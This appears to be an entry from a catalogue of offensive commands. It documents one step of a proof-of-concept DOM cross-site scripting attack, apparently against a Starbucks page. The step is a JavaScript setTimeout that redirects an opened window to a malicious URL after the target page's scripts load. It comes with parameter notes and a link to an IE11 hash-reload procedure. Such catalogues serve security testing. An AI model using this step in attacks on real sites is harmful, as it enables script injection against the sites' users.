---
data: 'setTimeout(function(){win.location=url}, 5000);'
tags:
  - xss
  - poc
  - delay
type: command
output: Delays execution for 5 seconds before proceeding.
executor: javascript
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:47:18.632Z'
id: b805f321-def1-4ffd-bfd6-6134ddebb864
verified: false
validated: true
submitted: true
---
# starbucks-xss-poc-wait

## Command

```javascript
setTimeout(function(){win.location=url}, 5000);
```

## Description

Introduces a 5-second delay to ensure the target page's JavaScript, including _observeHistory and jQuery, fully initializes before triggering the hash change.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| 5000 | Delay in milliseconds | Yes |
| win | Reference to the opened window | Yes |
| url | Malicious URL | Yes |

## Examples

### Basic Usage

```javascript
setTimeout(function(){win.location=url}, 5000);
```

### Advanced Usage

```javascript
setTimeout(function(){
  if (win && !win.closed) {
    win.location=url;
  }
}, 5000);
```

## Expected Output

No immediate output; after 5 seconds, the timeout callback is ready to execute the location change.

## Related

- [[Related Procedure|procedures/Trigger-DOM-XSS-via-Hash-Reload-on-IE11]]
